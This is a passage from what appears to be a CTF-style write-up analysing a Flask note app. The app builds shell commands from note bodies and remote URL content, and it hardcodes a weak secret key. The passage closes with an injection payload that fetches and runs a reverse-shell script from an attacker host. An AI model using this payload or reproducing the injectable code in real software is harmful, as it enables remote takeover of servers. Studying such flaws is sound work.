              <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
            
              <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span> <span class="o">+</span><span class="sh">'</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    
          <span class="k">else</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard.html</span><span class="sh">'</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1">## Export remote
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/export_note_remote</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
    
              <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="nf">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    
              <span class="nf">if </span><span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                  <span class="k">try</span><span class="p">:</span>
                      <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                      <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                      <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">node misc/md-to-pdf.js  $</span><span class="sh">'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="sh">"</span>
                      <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
    
                      <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">):</span>
    
                          <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    
                      <span class="k">else</span><span class="p">:</span>
                          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Error occured while exporting the !</span><span class="sh">"</span><span class="p">)</span>
    
                  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Error occured!</span><span class="sh">"</span><span class="p">)</span>
    
              <span class="k">else</span><span class="p">:</span>
                  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error occured while exporting ! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
                
          <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">export_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error occured while exporting ! (</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1">## Import notes
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/import_note</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">import_note</span><span class="p">():</span>
    
      <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
          <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
              <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">import_note.html</span><span class="sh">'</span><span class="p">)</span>
    
          <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
              <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">]</span>
              <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
    
              <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="nf">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    
              <span class="nf">if </span><span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                  <span class="k">try</span><span class="p">:</span>
                      <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                      <span class="n">md</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\n\n</span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)[:])</span>
    
                      <span class="n">body</span> <span class="o">=</span> <span class="n">markdown</span><span class="p">.</span><span class="nf">markdown</span><span class="p">(</span><span class="n">md</span><span class="p">)</span>
                      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
                      <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) </span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">[:</span><span class="mi">900</span><span class="p">],</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">time</span><span class="p">.</span><span class="nf">ctime</span><span class="p">()))</span>
                      <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
                      <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
                      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">import_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="sh">"</span><span class="s">Note imported successfully!</span><span class="sh">"</span><span class="p">)</span>
    
                    
                  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">import_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">An error occured when importing!</span><span class="sh">"</span><span class="p">)</span>
    
              <span class="k">else</span><span class="p">:</span>
                  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">import_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">An error occured when importing! (</span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
    
      <span class="k">else</span><span class="p">:</span>
          <span class="nf">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
    
  <span class="c1">## upgrade to VIP
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/VIP</span><span class="sh">'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">upgrade</span><span class="p">():</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">upgrade.html</span><span class="sh">'</span><span class="p">)</span>
    
  <span class="c1">## note Form Class
</span>  <span class="k">class</span> <span class="nc">NoteForm</span><span class="p">(</span><span class="n">Form</span><span class="p">):</span>
      <span class="n">title</span> <span class="o">=</span> <span class="nc">StringField</span><span class="p">(</span><span class="sh">'</span><span class="s">Title</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="nc">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">200</span><span class="p">)])</span>
      <span class="n">body</span> <span class="o">=</span> <span class="nc">TextAreaField</span><span class="p">(</span><span class="sh">'</span><span class="s">Body</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="nc">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">30</span><span class="p">)])</span>
    
  <span class="c1">## Add note
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/add_note</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">add_note</span><span class="p">():</span>
      <span class="n">form</span> <span class="o">=</span> <span class="nc">NoteForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="nf">validate</span><span class="p">():</span>
          <span class="n">title</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">title</span><span class="p">.</span><span class="n">data</span>
          <span class="n">body</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">data</span>
          <span class="c1">## Create Cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
          <span class="c1">## Execute
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO notes(title, body, author,create_date ) VALUES(%s, %s, %s, %s)</span><span class="sh">"</span><span class="p">,(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">time</span><span class="p">.</span><span class="nf">ctime</span><span class="p">()))</span>
    
          <span class="c1">## Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    
          <span class="c1">#Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
          <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">note Created</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1">## Edit note
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/edit_note/&lt;int:id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">edit_note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1">## Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
      <span class="c1">## Get note by id
</span>      <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes WHERE id = %s AND author = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
    
      <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
      <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
      <span class="c1">## Get form
</span>      <span class="n">form</span> <span class="o">=</span> <span class="nc">NoteForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
    
      <span class="c1">## Populate note form fields
</span>      <span class="n">form</span><span class="p">.</span><span class="n">title</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">]</span>
      <span class="n">form</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">]</span>
    
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="nf">validate</span><span class="p">():</span>
          <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">]</span>
          <span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">]</span>
    
          <span class="c1">## Create Cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
          <span class="n">app</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
          <span class="c1">## Execute
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">execute </span><span class="p">(</span><span class="sh">"</span><span class="s">UPDATE notes SET title=%s, body=%s WHERE id=%s  AND author = %s</span><span class="sh">"</span><span class="p">,(</span><span class="n">title</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
          <span class="c1">## Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    
          <span class="c1">#Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
          <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">note Updated</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit_note.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1">## Delete note
</span>  <span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/delete_note/&lt;int:id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
  <span class="nd">@is_logged_in</span>
  <span class="k">def</span> <span class="nf">delete_note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1">## Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    
      <span class="c1">## Execute
</span>      <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">DELETE FROM notes WHERE id = %s AND author= %s</span><span class="sh">"</span><span class="p">,(</span><span class="nb">id</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
    
      <span class="c1">## Commit to DB
</span>      <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    
      <span class="c1">#Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
      <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Note deleted</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
    
      <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard</span><span class="sh">'</span><span class="p">))</span>
    
  <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
      <span class="n">app</span><span class="p">.</span><span class="n">secret_key</span><span class="o">=</span><span class="sh">'</span><span class="s">secret123</span><span class="sh">'</span>
      <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h3 id="arbitrary-code-injection"><span class="me-2">Arbitrary Code Injection</span><a href="#arbitrary-code-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><strong>app.py</strong> used user controllable input (from already created notes or through arbitrary external resources) to build a system command. It is possible to inject arbitrary code in order to affect the expected behavior of the software.</p>

<p>Vulnerable code:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/export_note_local/&lt;string:id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_local</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM notes WHERE id = %s and author = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]))</span>
        <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
            <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">node misc/md-to-pdf.js  $</span><span class="sh">'</span><span class="si">{</span><span class="n">note</span><span class="p">[</span><span class="sh">'</span><span class="s">body</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="sh">"</span>
            <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span> <span class="o">+</span><span class="sh">'</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="bp">...</span>

<span class="c1">## Export remote
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/export_note_remote</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@is_logged_in</span>
<span class="k">def</span> <span class="nf">export_note_remote</span><span class="p">():</span>
    <span class="k">if</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">url</span><span class="sh">'</span><span class="p">]</span>
            <span class="n">status</span><span class="p">,</span> <span class="n">error</span> <span class="o">=</span> <span class="nf">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="nf">if </span><span class="p">(</span><span class="n">status</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">error</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">r</span> <span class="o">=</span> <span class="n">pyrequest</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                    <span class="n">rand_int</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
                    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">node misc/md-to-pdf.js  $</span><span class="sh">'</span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="si">{</span><span class="n">rand_int</span><span class="si">}</span><span class="sh">"</span>
                    <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">executable</span><span class="o">=</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">):</span>
                        <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">attachment_dir</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rand_int</span><span class="p">)</span><span class="si">}</span><span class="s">.pdf</span><span class="sh">'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
                   <span class="bp">...</span>
</pre></td></tr></tbody></table></code></div></div>
<p>exploit.md:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s1">';curl http://10.10.14.3/rev.sh|/bin/bash;'</span>
